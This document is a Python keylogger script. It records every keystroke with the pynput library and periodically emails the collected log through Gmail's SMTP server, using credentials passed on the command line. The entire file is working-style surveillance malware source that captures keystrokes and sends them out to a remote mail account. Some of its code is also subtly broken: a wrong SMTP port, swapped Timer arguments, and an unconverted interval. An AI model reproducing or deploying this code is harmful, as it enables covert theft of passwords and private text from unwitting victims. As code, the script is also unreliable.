#! /usr/bin/python3

import pynput 
import smtplib
import threading
import subprocess 
import sys
import optparse 
import time 

class Key_logger:
    def __init__(self):
        self.get_arguments()
        self.log = "Welcome to my Logger"
    
    def get_arguments(self):
        parser = optparse.OptionParser()
        parser.add_option("-e","--email",dest="email",help="Type in your email address")
        parser.add_option("-p","--password",dest="password",help="Type your email password")
        parser.add_option("-i","--interval",dest="interval",help="Pauses and starts report after time(seconds)")
        user_arguments = parser.parse_args()[0]
        if not user_arguments.email:
            parser.error("Type in your email,type --help for more info")
        elif not user_arguments.password:
            parser.error("Type in your password...,type -- help for more info")
        elif not user_arguments.interval:
            parser.error("Pause and start again the report after time(seconds),type --help for more info")
        else:
            self.interval = user_arguments.interval
            self.password = user_arguments.password 
            self.email = user_arguments.email
    
    def send_email(self,email,password,message):
        try:
            server = smtplib.SMTP("smtp.gmail.com","487")
            server.starttls()
            server.login(email,password)
            server.sendmail(email,email,message + "\n\n")
            server.quit()
        except Exception:
            print("Error you typed wrong credentials or you need to make changes in your gmail account in the security settings")
            sys.exit(0)

    def start_timer(self):
        timer = threading.Timer(self.start_timer,self.interval)
        self.send_email(self.email,self.password,self.log)
        self.log = ""
        timer.start()

    def append_to_log(self,string):
        self.log = self.log + string

    def key_analyzer(self,key):
        try:
            current_log = str(key.char) + " "
            print(current_log)
        except AttributeError:
            if key == key.space:
                current_log = " "
            else:
                current_log = str(key) + " " 
        except KeyboardInterrupt:
            print("Exiting...") 
            time.sleep(2)
            sys.exit(0)     
        self.append_to_log(current_log)

    def start_logger(self):
        listener = pynput.keyboard.Listener(on_press=self.key_analyzer)
        with listener:
            self.start_timer()
            listener.join()

logger = Key_logger()
logger.start_logger()